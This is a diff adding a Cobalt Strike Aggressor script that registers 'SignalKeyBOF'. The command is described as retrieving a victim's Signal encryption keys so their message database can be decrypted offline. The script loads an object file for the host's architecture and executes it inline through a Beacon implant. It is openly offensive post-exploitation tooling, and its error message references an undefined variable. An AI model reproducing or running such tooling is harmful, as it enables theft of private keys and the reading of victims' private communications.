@@ -1,0 +1,27 @@
+beacon_command_register(
+    "SignalKeyBOF",
+    "Used to retrieve the victim's Signal keys to decrypt the message DB offline",
+    "\n\nUsage:\n\n" .
+    "SignalKeyBOF\n\n" .
+    "Examples:\n" .
+    '   SignalKeyBOF' .
+    "\n\nMade by - 0xRedpoll\n\n"
+
+);
+
+alias SignalKeyBOF {
+    local('$bid $barch $handle $data $args');
+    $bid = $1;
+    $barch = barch($bid);
+    $handle = openf(script_resource("SignalKey. $+ $barch $+ .o"));
+    $data = readb($handle,-1);
+    if(strlen($data) == 0)
+    {
+        berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
+    }
+    closef($handle);
+    btask($bid, "Running SignalKeyBOF - Made by 0xRedpoll");
+
+    beacon_inline_execute($bid,$data,"go");
+
+}
